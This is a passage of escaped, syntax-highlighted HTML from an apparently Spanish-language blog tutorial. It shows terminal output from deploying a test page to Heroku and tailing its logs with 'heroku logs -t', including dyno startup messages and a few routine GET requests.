&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;✗&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;Test&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y una vez situados dentro del directorio de vuestro proyecto, aplicáis el siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;┌─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parrot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;─&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s4vitar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;└──╼&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heroku&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;logs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;
&lt;span class=&quot;m&quot;&gt;2020&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;21.183720&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heroku&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Unidling&lt;/span&gt;
&lt;span class=&quot;m&quot;&gt;2020&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;21.187564&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heroku&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;State&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;down&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;starting&lt;/span&gt;
&lt;span class=&quot;m&quot;&gt;2020&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;21.218354&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heroku&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Unidling&lt;/span&gt;
&lt;span class=&quot;m&quot;&gt;2020&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;21.233848&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heroku&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;State&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;down&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;starting&lt;/span&gt;
&lt;span class=&quot;m&quot;&gt;2020&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;22.506281&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heroku&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Starting&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;`heroku-php-apache2`&lt;/span&gt;
&lt;span class=&quot;m&quot;&gt;2020&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;25.046504&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Optimizing&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;defaults&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;X&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dyno&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;m&quot;&gt;2020&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;25.216868&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;processes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;at&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MB&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memory&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;m&quot;&gt;2020&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;25.222173&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Starting&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fpm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;m&quot;&gt;2020&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;27.410773&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heroku&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;State&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;starting&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;up&lt;/span&gt;
&lt;span class=&quot;m&quot;&gt;2020&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;27.224962&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Starting&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;m&quot;&gt;2020&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;28.234835&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;10.111.222.196&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Feb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2020&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;GET / HTTP/1.1&quot;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;302&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-&quot;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36
2020-02-03T11:15:28.278228+00:00 app[web.1]: 10.41.198.134 - - [03/Feb/2020:11:15:28 +0000] &quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;robots&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; 404 208 &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Mozilla&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5.0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;X11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Linux&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x86_64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AppleWebKit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;537.36&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KHTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;like&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Gecko&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Chrome&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;77.0.3865.120&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Safari&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;537.36&lt;/span&gt;
&lt;span class=&quot;m&quot;&gt;2020&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;28.375383&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;10.111.222.196&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Feb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2020&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;GET /index.html HTTP/1.1&quot;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-&quot;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36
2020-02-03T11:15:28.234477+00:00 heroku[router]: at=info method=GET path=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; host=s4vitar.herokuapp.com request_id=1cc5b49f-eaba-4f5d-828c-4f1ac3dcddcc fwd=&quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XXX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XXX&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;.160&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; dyno=web.1 connect=1ms service=3ms status=302 bytes=176 protocol=http
2020-02-03T11:15:28.279973+00:00 heroku[router]: at=info method=GET path=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;robots&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; host=s4vitar.herokuapp.com request_id=750ddd73-a1f7-4616-9827-119e5b3f280e fwd=&quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XXX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;XXX&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;.160&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; dyno=web.1 connect=1ms service=2ms status=404 bytes=372 protocol=http
